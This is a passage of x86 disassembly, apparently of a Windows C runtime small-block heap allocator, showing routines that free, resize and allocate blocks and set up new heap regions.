  4267d9:	and    DWORD PTR [ecx],esi
  4267db:	jmp    0x4267f7
  4267dd:	lea    ecx,[ebx-0x20]
  4267e0:	shr    esi,cl
  4267e2:	not    esi
  4267e4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4267eb:	dec    BYTE PTR [ebx+eax*1+0x4]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],esi
  4267f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4267fa:	mov    esi,DWORD PTR [ecx+0x8]
  4267fd:	mov    ecx,DWORD PTR [ecx+0x4]
  426800:	mov    DWORD PTR [esi+0x4],ecx
  426803:	mov    ecx,DWORD PTR [ebp+0xc]
  426806:	mov    esi,DWORD PTR [ecx+0x4]
  426809:	mov    ecx,DWORD PTR [ecx+0x8]
  42680c:	mov    DWORD PTR [esi+0x8],ecx
  42680f:	mov    esi,DWORD PTR [ebp+0xc]
  426812:	jmp    0x426817
  426814:	mov    ebx,DWORD PTR [ebp+0x8]
  426817:	cmp    DWORD PTR [ebp-0xc],0x0
  42681b:	jne    0x426825
  42681d:	cmp    ebx,edx
  42681f:	je     0x4268a5
  426825:	mov    ecx,DWORD PTR [ebp-0x10]
  426828:	lea    ecx,[ecx+edx*8]
  42682b:	mov    ebx,DWORD PTR [ecx+0x4]
  42682e:	mov    DWORD PTR [esi+0x8],ecx
  426831:	mov    DWORD PTR [esi+0x4],ebx
  426834:	mov    DWORD PTR [ecx+0x4],esi
  426837:	mov    ecx,DWORD PTR [esi+0x4]
  42683a:	mov    DWORD PTR [ecx+0x8],esi
  42683d:	mov    ecx,DWORD PTR [esi+0x4]
  426840:	cmp    ecx,DWORD PTR [esi+0x8]
  426843:	jne    0x4268a5
  426845:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426849:	mov    BYTE PTR [ebp+0xf],cl
  42684c:	inc    cl
  42684e:	cmp    edx,0x20
  426851:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426855:	jae    0x42687c
  426857:	cmp    BYTE PTR [ebp+0xf],0x0
  42685b:	jne    0x42686b
  42685d:	mov    ecx,edx
  42685f:	mov    ebx,0x80000000
  426864:	shr    ebx,cl
  426866:	mov    ecx,DWORD PTR [ebp+0x8]
  426869:	or     DWORD PTR [ecx],ebx
  42686b:	mov    ebx,0x80000000
  426870:	mov    ecx,edx
  426872:	shr    ebx,cl
  426874:	lea    eax,[eax+edi*4+0x44]
  426878:	or     DWORD PTR [eax],ebx
  42687a:	jmp    0x4268a5
  42687c:	cmp    BYTE PTR [ebp+0xf],0x0
  426880:	jne    0x426892
  426882:	lea    ecx,[edx-0x20]
  426885:	mov    ebx,0x80000000
  42688a:	shr    ebx,cl
  42688c:	mov    ecx,DWORD PTR [ebp+0x8]
  42688f:	or     DWORD PTR [ecx+0x4],ebx
  426892:	lea    ecx,[edx-0x20]
  426895:	mov    edx,0x80000000
  42689a:	shr    edx,cl
  42689c:	lea    eax,[eax+edi*4+0xc4]
  4268a3:	or     DWORD PTR [eax],edx
  4268a5:	mov    eax,DWORD PTR [ebp-0x4]
  4268a8:	mov    DWORD PTR [esi],eax
  4268aa:	mov    DWORD PTR [eax+esi*1-0x4],eax
  4268ae:	mov    eax,DWORD PTR [ebp-0x10]
  4268b1:	dec    DWORD PTR [eax]
  4268b3:	jne    0x4269b0
  4268b9:	mov    eax,ds:0x4674b8
  4268be:	test   eax,eax
  4268c0:	je     0x4269a2
  4268c6:	mov    ecx,DWORD PTR ds:0x4674d0
  4268cc:	mov    esi,DWORD PTR ds:0x42904c
  4268d2:	push   0x4000
  4268d7:	shl    ecx,0xf
  4268da:	add    ecx,DWORD PTR [eax+0xc]
  4268dd:	mov    ebx,0x8000
  4268e2:	push   ebx
  4268e3:	push   ecx
  4268e4:	call   esi
  4268e6:	mov    ecx,DWORD PTR ds:0x4674d0
  4268ec:	mov    eax,ds:0x4674b8
  4268f1:	mov    edx,0x80000000
  4268f6:	shr    edx,cl
  4268f8:	or     DWORD PTR [eax+0x8],edx
  4268fb:	mov    eax,ds:0x4674b8
  426900:	mov    eax,DWORD PTR [eax+0x10]
  426903:	mov    ecx,DWORD PTR ds:0x4674d0
  426909:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426911:	mov    eax,ds:0x4674b8
  426916:	mov    eax,DWORD PTR [eax+0x10]
  426919:	dec    BYTE PTR [eax+0x43]
  42691c:	mov    eax,ds:0x4674b8
  426921:	mov    ecx,DWORD PTR [eax+0x10]
  426924:	cmp    BYTE PTR [ecx+0x43],0x0
  426928:	jne    0x426933
  42692a:	and    DWORD PTR [eax+0x4],0xfffffffe
  42692e:	mov    eax,ds:0x4674b8
  426933:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426937:	jne    0x4269a2
  426939:	push   ebx
  42693a:	push   0x0
  42693c:	push   DWORD PTR [eax+0xc]
  42693f:	call   esi
  426941:	mov    eax,ds:0x4674b8
  426946:	push   DWORD PTR [eax+0x10]
  426949:	push   0x0
  42694b:	push   DWORD PTR ds:0x467700
  426951:	call   DWORD PTR ds:0x429058
  426957:	mov    eax,ds:0x4674bc
  42695c:	mov    edx,DWORD PTR ds:0x4674c0
  426962:	lea    eax,[eax+eax*4]
  426965:	shl    eax,0x2
  426968:	mov    ecx,eax
  42696a:	mov    eax,ds:0x4674b8
  42696f:	sub    ecx,eax
  426971:	lea    ecx,[ecx+edx*1-0x14]
  426975:	push   ecx
  426976:	lea    ecx,[eax+0x14]
  426979:	push   ecx
  42697a:	push   eax
  42697b:	call   0x4281d0
  426980:	mov    eax,DWORD PTR [ebp+0x8]
  426983:	add    esp,0xc
  426986:	dec    DWORD PTR ds:0x4674bc
  42698c:	cmp    eax,DWORD PTR ds:0x4674b8
  426992:	jbe    0x426998
  426994:	sub    DWORD PTR [ebp+0x8],0x14
  426998:	mov    eax,ds:0x4674c0
  42699d:	mov    ds:0x4674c8,eax
  4269a2:	mov    eax,DWORD PTR [ebp+0x8]
  4269a5:	mov    ds:0x4674b8,eax
  4269aa:	mov    DWORD PTR ds:0x4674d0,edi
  4269b0:	pop    ebx
  4269b1:	pop    edi
  4269b2:	pop    esi
  4269b3:	leave  
  4269b4:	ret    
  4269b5:	mov    eax,ds:0x4674bc
  4269ba:	mov    ecx,DWORD PTR ds:0x4674cc
  4269c0:	push   edi
  4269c1:	xor    edi,edi
  4269c3:	cmp    eax,ecx
  4269c5:	jne    0x4269fb
  4269c7:	lea    eax,[ecx+ecx*4+0x50]
  4269cb:	shl    eax,0x2
  4269ce:	push   eax
  4269cf:	push   DWORD PTR ds:0x4674c0
  4269d5:	push   edi
  4269d6:	push   DWORD PTR ds:0x467700
  4269dc:	call   DWORD PTR ds:0x4290e8
  4269e2:	cmp    eax,edi
  4269e4:	jne    0x4269ea
  4269e6:	xor    eax,eax
  4269e8:	pop    edi
  4269e9:	ret    
  4269ea:	add    DWORD PTR ds:0x4674cc,0x10
  4269f1:	mov    ds:0x4674c0,eax
  4269f6:	mov    eax,ds:0x4674bc
  4269fb:	mov    ecx,DWORD PTR ds:0x4674c0
  426a01:	push   esi
  426a02:	push   0x41c4
  426a07:	push   0x8
  426a09:	push   DWORD PTR ds:0x467700
  426a0f:	lea    eax,[eax+eax*4]
  426a12:	lea    esi,[ecx+eax*4]
  426a15:	call   DWORD PTR ds:0x4290dc
  426a1b:	cmp    eax,edi
  426a1d:	mov    DWORD PTR [esi+0x10],eax
  426a20:	jne    0x426a26
  426a22:	xor    eax,eax
  426a24:	jmp    0x426a69
  426a26:	push   0x4
  426a28:	push   0x2000
  426a2d:	push   0x100000
  426a32:	push   edi
  426a33:	call   DWORD PTR ds:0x4290e4
  426a39:	cmp    eax,edi
  426a3b:	mov    DWORD PTR [esi+0xc],eax
  426a3e:	jne    0x426a52
  426a40:	push   DWORD PTR [esi+0x10]
  426a43:	push   edi
  426a44:	push   DWORD PTR ds:0x467700
  426a4a:	call   DWORD PTR ds:0x429058
  426a50:	jmp    0x426a22
  426a52:	or     DWORD PTR [esi+0x8],0xffffffff
  426a56:	mov    DWORD PTR [esi],edi
  426a58:	mov    DWORD PTR [esi+0x4],edi
  426a5b:	inc    DWORD PTR ds:0x4674bc
  426a61:	mov    eax,DWORD PTR [esi+0x10]
  426a64:	or     DWORD PTR [eax],0xffffffff
  426a67:	mov    eax,esi
  426a69:	pop    esi
  426a6a:	pop    edi
  426a6b:	ret    
  426a6c:	push   ebp
  426a6d:	mov    ebp,esp
  426a6f:	push   ecx
  426a70:	push   ecx
  426a71:	mov    ecx,DWORD PTR [ebp+0x8]
  426a74:	mov    eax,DWORD PTR [ecx+0x8]
  426a77:	push   ebx
  426a78:	push   esi
  426a79:	mov    esi,DWORD PTR [ecx+0x10]
  426a7c:	push   edi
  426a7d:	xor    ebx,ebx
  426a7f:	jmp    0x426a84
  426a81:	shl    eax,1
  426a83:	inc    ebx
  426a84:	test   eax,eax
  426a86:	jge    0x426a81
  426a88:	mov    eax,ebx
  426a8a:	imul   eax,eax,0x204
  426a90:	lea    eax,[eax+esi*1+0x144]
  426a97:	push   0x3f
  426a99:	mov    DWORD PTR [ebp-0x8],eax
  426a9c:	pop    edx
  426a9d:	mov    DWORD PTR [eax+0x8],eax
  426aa0:	mov    DWORD PTR [eax+0x4],eax
  426aa3:	add    eax,0x8
  426aa6:	dec    edx
  426aa7:	jne    0x426a9d
  426aa9:	push   0x4
  426aab:	mov    edi,ebx
  426aad:	push   0x1000
  426ab2:	shl    edi,0xf
  426ab5:	add    edi,DWORD PTR [ecx+0xc]
  426ab8:	push   0x8000
  426abd:	push   edi
  426abe:	call   DWORD PTR ds:0x4290e4
  426ac4:	test   eax,eax
  426ac6:	jne    0x426ad0
  426ac8:	or     eax,0xffffffff
  426acb:	jmp    0x426b6d
  426ad0:	lea    edx,[edi+0x7000]
  426ad6:	cmp    edi,edx
  426ad8:	mov    DWORD PTR [ebp-0x4],edx
  426adb:	ja     0x426b20
  426add:	mov    ecx,edx
  426adf:	sub    ecx,edi
  426ae1:	shr    ecx,0xc
  426ae4:	lea    eax,[edi+0x10]
  426ae7:	inc    ecx
  426ae8:	or     DWORD PTR [eax-0x8],0xffffffff
  426aec:	or     DWORD PTR [eax+0xfec],0xffffffff
  426af3:	lea    edx,[eax+0xffc]
  426af9:	mov    DWORD PTR [eax],edx
  426afb:	lea    edx,[eax-0x1004]
  426b01:	mov    DWORD PTR [eax-0x4],0xff0
  426b08:	mov    DWORD PTR [eax+0x4],edx
  426b0b:	mov    DWORD PTR [eax+0xfe8],0xff0
  426b15:	add    eax,0x1000
  426b1a:	dec    ecx
  426b1b:	jne    0x426ae8
  426b1d:	mov    edx,DWORD PTR [ebp-0x4]
  426b20:	mov    eax,DWORD PTR [ebp-0x8]
  426b23:	add    eax,0x1f8
  426b28:	lea    ecx,[edi+0xc]
  426b2b:	mov    DWORD PTR [eax+0x4],ecx
  426b2e:	mov    DWORD PTR [ecx+0x8],eax
  426b31:	lea    ecx,[edx+0xc]
  426b34:	mov    DWORD PTR [eax+0x8],ecx
  426b37:	mov    DWORD PTR [ecx+0x4],eax
  426b3a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426b3f:	xor    edi,edi
  426b41:	inc    edi
  426b42:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426b49:	mov    al,BYTE PTR [esi+0x43]
  426b4c:	mov    cl,al
  426b4e:	inc    cl
  426b50:	test   al,al
  426b52:	mov    eax,DWORD PTR [ebp+0x8]
  426b55:	mov    BYTE PTR [esi+0x43],cl
  426b58:	jne    0x426b5d
  426b5a:	or     DWORD PTR [eax+0x4],edi
  426b5d:	mov    edx,0x80000000
  426b62:	mov    ecx,ebx
  426b64:	shr    edx,cl
  426b66:	not    edx
  426b68:	and    DWORD PTR [eax+0x8],edx
  426b6b:	mov    eax,ebx
  426b6d:	pop    edi
  426b6e:	pop    esi
  426b6f:	pop    ebx
  426b70:	leave  
  426b71:	ret    
  426b72:	push   ebp
  426b73:	mov    ebp,esp
  426b75:	sub    esp,0xc
  426b78:	mov    ecx,DWORD PTR [ebp+0x8]
  426b7b:	mov    eax,DWORD PTR [ecx+0x10]
  426b7e:	push   ebx
  426b7f:	push   esi
  426b80:	mov    esi,DWORD PTR [ebp+0x10]
  426b83:	push   edi
  426b84:	mov    edi,DWORD PTR [ebp+0xc]
  426b87:	mov    edx,edi
  426b89:	sub    edx,DWORD PTR [ecx+0xc]
  426b8c:	add    esi,0x17
  426b8f:	shr    edx,0xf
  426b92:	mov    ecx,edx
  426b94:	imul   ecx,ecx,0x204
  426b9a:	lea    ecx,[ecx+eax*1+0x144]
  426ba1:	mov    DWORD PTR [ebp-0xc],ecx
  426ba4:	mov    ecx,DWORD PTR [edi-0x4]
  426ba7:	and    esi,0xfffffff0
  426baa:	dec    ecx
  426bab:	cmp    esi,ecx
  426bad:	lea    edi,[ecx+edi*1-0x4]
  426bb1:	mov    ebx,DWORD PTR [edi]
  426bb3:	mov    DWORD PTR [ebp+0x10],ecx
  426bb6:	mov    DWORD PTR [ebp-0x4],ebx
  426bb9:	jle    0x426d14
  426bbf:	test   bl,0x1
  426bc2:	jne    0x426d0d
  426bc8:	add    ebx,ecx
  426bca:	cmp    esi,ebx
  426bcc:	jg     0x426d0d
  426bd2:	mov    ecx,DWORD PTR [ebp-0x4]
  426bd5:	sar    ecx,0x4
  426bd8:	dec    ecx
  426bd9:	cmp    ecx,0x3f
  426bdc:	mov    DWORD PTR [ebp-0x8],ecx
  426bdf:	jbe    0x426be7
  426be1:	push   0x3f
  426be3:	pop    ecx
  426be4:	mov    DWORD PTR [ebp-0x8],ecx
  426be7:	mov    ebx,DWORD PTR [edi+0x4]
  426bea:	cmp    ebx,DWORD PTR [edi+0x8]
  426bed:	jne    0x426c32
  426bef:	cmp    ecx,0x20
  426bf2:	mov    ebx,0x80000000
  426bf7:	jae    0x426c13
  426bf9:	shr    ebx,cl
  426bfb:	mov    ecx,DWORD PTR [ebp-0x8]
  426bfe:	lea    ecx,[ecx+eax*1+0x4]
  426c02:	not    ebx
  426c04:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426c08:	dec    BYTE PTR [ecx]
  426c0a:	jne    0x426c32
  426c0c:	mov    ecx,DWORD PTR [ebp+0x8]
  426c0f:	and    DWORD PTR [ecx],ebx
  426c11:	jmp    0x426c32
  426c13:	add    ecx,0xffffffe0
  426c16:	shr    ebx,cl
  426c18:	mov    ecx,DWORD PTR [ebp-0x8]
  426c1b:	lea    ecx,[ecx+eax*1+0x4]
  426c1f:	not    ebx
  426c21:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426c28:	dec    BYTE PTR [ecx]
  426c2a:	jne    0x426c32
  426c2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2f:	and    DWORD PTR [ecx+0x4],ebx
  426c32:	mov    ecx,DWORD PTR [edi+0x8]
  426c35:	mov    ebx,DWORD PTR [edi+0x4]
  426c38:	mov    DWORD PTR [ecx+0x4],ebx
  426c3b:	mov    ecx,DWORD PTR [edi+0x4]
  426c3e:	mov    edi,DWORD PTR [edi+0x8]
  426c41:	mov    DWORD PTR [ecx+0x8],edi
  426c44:	mov    ecx,DWORD PTR [ebp+0x10]
  426c47:	sub    ecx,esi
  426c49:	add    DWORD PTR [ebp-0x4],ecx
  426c4c:	cmp    DWORD PTR [ebp-0x4],0x0
  426c50:	jle    0x426cfb
  426c56:	mov    edi,DWORD PTR [ebp-0x4]
  426c59:	mov    ecx,DWORD PTR [ebp+0xc]
  426c5c:	sar    edi,0x4
  426c5f:	dec    edi
  426c60:	cmp    edi,0x3f
  426c63:	lea    ecx,[ecx+esi*1-0x4]
  426c67:	jbe    0x426c6c
  426c69:	push   0x3f
  426c6b:	pop    edi
  426c6c:	mov    ebx,DWORD PTR [ebp-0xc]
  426c6f:	lea    ebx,[ebx+edi*8]
  426c72:	mov    DWORD PTR [ebp+0x10],ebx
  426c75:	mov    ebx,DWORD PTR [ebx+0x4]
  426c78:	mov    DWORD PTR [ecx+0x4],ebx
  426c7b:	mov    ebx,DWORD PTR [ebp+0x10]
  426c7e:	mov    DWORD PTR [ecx+0x8],ebx
  426c81:	mov    DWORD PTR [ebx+0x4],ecx
  426c84:	mov    ebx,DWORD PTR [ecx+0x4]
  426c87:	mov    DWORD PTR [ebx+0x8],ecx
  426c8a:	mov    ebx,DWORD PTR [ecx+0x4]
  426c8d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426c90:	jne    0x426ce9
  426c92:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426c96:	mov    BYTE PTR [ebp+0x13],cl
  426c99:	inc    cl
  426c9b:	cmp    edi,0x20
  426c9e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426ca2:	jae    0x426cc0
  426ca4:	cmp    BYTE PTR [ebp+0x13],0x0
  426ca8:	jne    0x426cb8
  426caa:	mov    ecx,edi
  426cac:	mov    ebx,0x80000000
  426cb1:	shr    ebx,cl
  426cb3:	mov    ecx,DWORD PTR [ebp+0x8]
  426cb6:	or     DWORD PTR [ecx],ebx
  426cb8:	lea    eax,[eax+edx*4+0x44]
  426cbc:	mov    ecx,edi
  426cbe:	jmp    0x426ce0
  426cc0:	cmp    BYTE PTR [ebp+0x13],0x0
  426cc4:	jne    0x426cd6
  426cc6:	lea    ecx,[edi-0x20]
  426cc9:	mov    ebx,0x80000000
  426cce:	shr    ebx,cl
  426cd0:	mov    ecx,DWORD PTR [ebp+0x8]
  426cd3:	or     DWORD PTR [ecx+0x4],ebx
  426cd6:	lea    eax,[eax+edx*4+0xc4]
  426cdd:	lea    ecx,[edi-0x20]
  426ce0:	mov    edx,0x80000000
  426ce5:	shr    edx,cl
  426ce7:	or     DWORD PTR [eax],edx
  426ce9:	mov    edx,DWORD PTR [ebp+0xc]
  426cec:	mov    ecx,DWORD PTR [ebp-0x4]
  426cef:	lea    eax,[edx+esi*1-0x4]
  426cf3:	mov    DWORD PTR [eax],ecx
  426cf5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426cf9:	jmp    0x426cfe
  426cfb:	mov    edx,DWORD PTR [ebp+0xc]
  426cfe:	lea    eax,[esi+0x1]
  426d01:	mov    DWORD PTR [edx-0x4],eax
  426d04:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426d08:	jmp    0x426e49
  426d0d:	xor    eax,eax
  426d0f:	jmp    0x426e4c
  426d14:	jge    0x426e49
  426d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  426d1d:	sub    DWORD PTR [ebp+0x10],esi
  426d20:	lea    ecx,[esi+0x1]
  426d23:	mov    DWORD PTR [ebx-0x4],ecx
  426d26:	lea    ebx,[ebx+esi*1-0x4]
  426d2a:	mov    esi,DWORD PTR [ebp+0x10]
  426d2d:	sar    esi,0x4
  426d30:	dec    esi
  426d31:	cmp    esi,0x3f
  426d34:	mov    DWORD PTR [ebp+0xc],ebx
  426d37:	mov    DWORD PTR [ebx-0x4],ecx
  426d3a:	jbe    0x426d3f
  426d3c:	push   0x3f
  426d3e:	pop    esi
  426d3f:	test   BYTE PTR [ebp-0x4],0x1
  426d43:	jne    0x426dc9
  426d49:	mov    esi,DWORD PTR [ebp-0x4]
  426d4c:	sar    esi,0x4
  426d4f:	dec    esi
  426d50:	cmp    esi,0x3f
  426d53:	jbe    0x426d58
  426d55:	push   0x3f
  426d57:	pop    esi
  426d58:	mov    ecx,DWORD PTR [edi+0x4]
  426d5b:	cmp    ecx,DWORD PTR [edi+0x8]
  426d5e:	jne    0x426da2
  426d60:	cmp    esi,0x20
  426d63:	mov    ebx,0x80000000
  426d68:	jae    0x426d83
  426d6a:	mov    ecx,esi
  426d6c:	shr    ebx,cl
  426d6e:	lea    esi,[esi+eax*1+0x4]
  426d72:	not    ebx
  426d74:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426d78:	dec    BYTE PTR [esi]
  426d7a:	jne    0x426d9f
  426d7c:	mov    ecx,DWORD PTR [ebp+0x8]
  426d7f:	and    DWORD PTR [ecx],ebx
  426d81:	jmp    0x426d9f
  426d83:	lea    ecx,[esi-0x20]
  426d86:	shr    ebx,cl
  426d88:	lea    ecx,[esi+eax*1+0x4]
  426d8c:	not    ebx
  426d8e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426d95:	dec    BYTE PTR [ecx]
  426d97:	jne    0x426d9f
  426d99:	mov    ecx,DWORD PTR [ebp+0x8]
  426d9c:	and    DWORD PTR [ecx+0x4],ebx
  426d9f:	mov    ebx,DWORD PTR [ebp+0xc]
  426da2:	mov    ecx,DWORD PTR [edi+0x8]
  426da5:	mov    esi,DWORD PTR [edi+0x4]
  426da8:	mov    DWORD PTR [ecx+0x4],esi
  426dab:	mov    esi,DWORD PTR [edi+0x8]
  426dae:	mov    ecx,DWORD PTR [edi+0x4]
  426db1:	mov    DWORD PTR [ecx+0x8],esi
  426db4:	mov    esi,DWORD PTR [ebp+0x10]
  426db7:	add    esi,DWORD PTR [ebp-0x4]
  426dba:	mov    DWORD PTR [ebp+0x10],esi
  426dbd:	sar    esi,0x4
  426dc0:	dec    esi
  426dc1:	cmp    esi,0x3f
  426dc4:	jbe    0x426dc9
  426dc6:	push   0x3f
  426dc8:	pop    esi
  426dc9:	mov    ecx,DWORD PTR [ebp-0xc]
  426dcc:	lea    ecx,[ecx+esi*8]
  426dcf:	mov    edi,DWORD PTR [ecx+0x4]
  426dd2:	mov    DWORD PTR [ebx+0x8],ecx
  426dd5:	mov    DWORD PTR [ebx+0x4],edi
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [ebx+0x4]
  426dde:	mov    DWORD PTR [ecx+0x8],ebx
  426de1:	mov    ecx,DWORD PTR [ebx+0x4]
  426de4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426de7:	jne    0x426e40
  426de9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ded:	mov    BYTE PTR [ebp+0xf],cl
  426df0:	inc    cl
  426df2:	cmp    esi,0x20
  426df5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426df9:	jae    0x426e17
  426dfb:	cmp    BYTE PTR [ebp+0xf],0x0
  426dff:	jne    0x426e0f
  426e01:	mov    ecx,esi
  426e03:	mov    edi,0x80000000
  426e08:	shr    edi,cl
  426e0a:	mov    ecx,DWORD PTR [ebp+0x8]
  426e0d:	or     DWORD PTR [ecx],edi
  426e0f:	lea    eax,[eax+edx*4+0x44]
  426e13:	mov    ecx,esi
  426e15:	jmp    0x426e37
  426e17:	cmp    BYTE PTR [ebp+0xf],0x0
  426e1b:	jne    0x426e2d
  426e1d:	lea    ecx,[esi-0x20]
  426e20:	mov    edi,0x80000000
  426e25:	shr    edi,cl
  426e27:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2a:	or     DWORD PTR [ecx+0x4],edi
  426e2d:	lea    eax,[eax+edx*4+0xc4]
  426e34:	lea    ecx,[esi-0x20]
  426e37:	mov    edx,0x80000000
  426e3c:	shr    edx,cl
  426e3e:	or     DWORD PTR [eax],edx
  426e40:	mov    eax,DWORD PTR [ebp+0x10]
  426e43:	mov    DWORD PTR [ebx],eax
  426e45:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426e49:	xor    eax,eax
  426e4b:	inc    eax
  426e4c:	pop    edi
  426e4d:	pop    esi
  426e4e:	pop    ebx
  426e4f:	leave  
  426e50:	ret    
  426e51:	push   ebp
  426e52:	mov    ebp,esp
  426e54:	sub    esp,0x14
  426e57:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5a:	mov    eax,ds:0x4674bc
  426e5f:	mov    edx,DWORD PTR ds:0x4674c0
  426e65:	add    ecx,0x17
  426e68:	and    ecx,0xfffffff0
  426e6b:	push   ebx
  426e6c:	mov    DWORD PTR [ebp-0x10],ecx
  426e6f:	sar    ecx,0x4
  426e72:	push   esi
  426e73:	lea    eax,[eax+eax*4]
  426e76:	push   edi
  426e77:	dec    ecx
  426e78:	cmp    ecx,0x20
  426e7b:	lea    edi,[edx+eax*4]
  426e7e:	mov    DWORD PTR [ebp-0x4],edi
  426e81:	jge    0x426e8e
  426e83:	or     esi,0xffffffff
  426e86:	shr    esi,cl
  426e88:	or     DWORD PTR [ebp-0x8],0xffffffff
  426e8c:	jmp    0x426e9b
  426e8e:	add    ecx,0xffffffe0
  426e91:	or     eax,0xffffffff
  426e94:	xor    esi,esi
  426e96:	shr    eax,cl
  426e98:	mov    DWORD PTR [ebp-0x8],eax
  426e9b:	mov    eax,ds:0x4674c8
  426ea0:	mov    ebx,eax
  426ea2:	mov    DWORD PTR [ebp-0xc],esi
  426ea5:	cmp    ebx,edi
  426ea7:	jmp    0x426ebd
  426ea9:	mov    ecx,DWORD PTR [ebx+0x4]
  426eac:	mov    edi,DWORD PTR [ebx]
  426eae:	and    ecx,DWORD PTR [ebp-0x8]
  426eb1:	and    edi,esi
  426eb3:	or     ecx,edi
  426eb5:	jne    0x426ec2
  426eb7:	add    ebx,0x14
  426eba:	cmp    ebx,DWORD PTR [ebp-0x4]
  426ebd:	mov    DWORD PTR [ebp+0x8],ebx
  426ec0:	jb     0x426ea9
  426ec2:	cmp    ebx,DWORD PTR [ebp-0x4]
  426ec5:	jne    0x426eeb
  426ec7:	mov    ebx,edx
  426ec9:	jmp    0x426edc
  426ecb:	mov    ecx,DWORD PTR [ebx+0x4]
  426ece:	mov    edi,DWORD PTR [ebx]
  426ed0:	and    ecx,DWORD PTR [ebp-0x8]
  426ed3:	and    edi,esi
  426ed5:	or     ecx,edi
  426ed7:	jne    0x426ee3
  426ed9:	add    ebx,0x14
  426edc:	cmp    ebx,eax
  426ede:	mov    DWORD PTR [ebp+0x8],ebx
  426ee1:	jb     0x426ecb
  426ee3:	cmp    ebx,eax
  426ee5:	je     0x426f7f
  426eeb:	mov    DWORD PTR ds:0x4674c8,ebx
  426ef1:	mov    eax,DWORD PTR [ebx+0x10]
  426ef4:	mov    edx,DWORD PTR [eax]
  426ef6:	cmp    edx,0xffffffff
  426ef9:	mov    DWORD PTR [ebp-0x4],edx
  426efc:	je     0x426f12
  426efe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426f05:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426f09:	and    ecx,DWORD PTR [ebp-0x8]
  426f0c:	and    edi,esi
  426f0e:	or     ecx,edi
  426f10:	jne    0x426f48
  426f12:	mov    edx,DWORD PTR [eax+0xc4]
  426f18:	and    edx,DWORD PTR [ebp-0x8]
  426f1b:	and    DWORD PTR [ebp-0x4],0x0
  426f1f:	lea    ecx,[eax+0x44]
  426f22:	mov    esi,DWORD PTR [ecx]
  426f24:	and    esi,DWORD PTR [ebp-0xc]
  426f27:	or     edx,esi
  426f29:	mov    esi,DWORD PTR [ebp-0xc]
  426f2c:	jne    0x426f45
  426f2e:	mov    edx,DWORD PTR [ecx+0x84]
  426f34:	and    edx,DWORD PTR [ebp-0x8]
  426f37:	inc    DWORD PTR [ebp-0x4]
  426f3a:	add    ecx,0x4
  426f3d:	mov    edi,DWORD PTR [ecx]
  426f3f:	and    edi,esi
  426f41:	or     edx,edi
  426f43:	je     0x426f2e
  426f45:	mov    edx,DWORD PTR [ebp-0x4]
  426f48:	mov    ecx,edx
  426f4a:	imul   ecx,ecx,0x204
  426f50:	lea    ecx,[ecx+eax*1+0x144]
  426f57:	mov    DWORD PTR [ebp-0xc],ecx
  426f5a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  426f5e:	xor    edi,edi
  426f60:	and    ecx,esi
  426f62:	jne    0x426fd1
  426f64:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426f6b:	and    ecx,DWORD PTR [ebp-0x8]
  426f6e:	push   0x20
  426f70:	pop    edi
  426f71:	jmp    0x426fd1
  426f73:	cmp    DWORD PTR [ebx+0x8],0x0
  426f77:	jne    0x426f84
  426f79:	add    ebx,0x14
  426f7c:	mov    DWORD PTR [ebp+0x8],ebx
  426f7f:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f82:	jb     0x426f73
  426f84:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f87:	jne    0x426faf
  426f89:	mov    ebx,edx
  426f8b:	jmp    0x426f96
  426f8d:	cmp    DWORD PTR [ebx+0x8],0x0
  426f91:	jne    0x426f9d
  426f93:	add    ebx,0x14
  426f96:	cmp    ebx,eax
  426f98:	mov    DWORD PTR [ebp+0x8],ebx
  426f9b:	jb     0x426f8d
  426f9d:	cmp    ebx,eax
  426f9f:	jne    0x426faf
  426fa1:	call   0x4269b5
  426fa6:	mov    ebx,eax
  426fa8:	test   ebx,ebx
  426faa:	mov    DWORD PTR [ebp+0x8],ebx
  426fad:	je     0x426fc7
  426faf:	push   ebx
  426fb0:	call   0x426a6c
  426fb5:	pop    ecx
  426fb6:	mov    ecx,DWORD PTR [ebx+0x10]
  426fb9:	mov    DWORD PTR [ecx],eax
  426fbb:	mov    eax,DWORD PTR [ebx+0x10]
  426fbe:	cmp    DWORD PTR [eax],0xffffffff
  426fc1:	jne    0x426eeb
  426fc7:	xor    eax,eax
  426fc9:	jmp    0x427148
  426fce:	shl    ecx,1
  426fd0:	inc    edi
  426fd1:	test   ecx,ecx
  426fd3:	jge    0x426fce
  426fd5:	mov    ecx,DWORD PTR [ebp-0xc]
  426fd8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  426fdc:	mov    ecx,DWORD PTR [edx]
  426fde:	sub    ecx,DWORD PTR [ebp-0x10]
  426fe1:	mov    esi,ecx
  426fe3:	sar    esi,0x4
  426fe6:	dec    esi
  426fe7:	cmp    esi,0x3f
  426fea:	mov    DWORD PTR [ebp-0x8],ecx
